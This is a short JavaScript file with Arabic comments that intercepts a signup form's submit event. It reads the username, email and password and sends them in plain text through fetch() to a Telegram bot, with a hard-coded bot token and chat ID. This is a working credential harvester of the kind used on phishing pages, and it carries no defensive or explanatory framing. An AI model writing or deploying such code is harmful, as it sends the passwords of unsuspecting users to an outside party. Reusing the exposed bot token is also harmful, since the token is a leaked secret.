document.getElementById('signup-form').addEventListener('submit', function (e) {
    e.preventDefault(); // منع إرسال النموذج بالطريقة التقليدية

    const username = document.getElementById('username').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // إرسال البيانات إلى بوت تيليجرام
    const message = `اسم المستخدم: ${username}\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}`;
    const token = '8420977917:AAFgRHgmBaUNmo4o0QgGD99aIc-UEmlL3X8';
    const chatId = '7383092654';
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => {
            if (response.ok) {
                alert('تم إرسال البيانات بنجاح!');
                // يمكنك تنفيذ المزيد من الإجراءات هنا
            } else {
                alert('حدث خطأ أثناء إرسال البيانات!');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('حدث خطأ أثناء إرسال البيانات!');
        });
});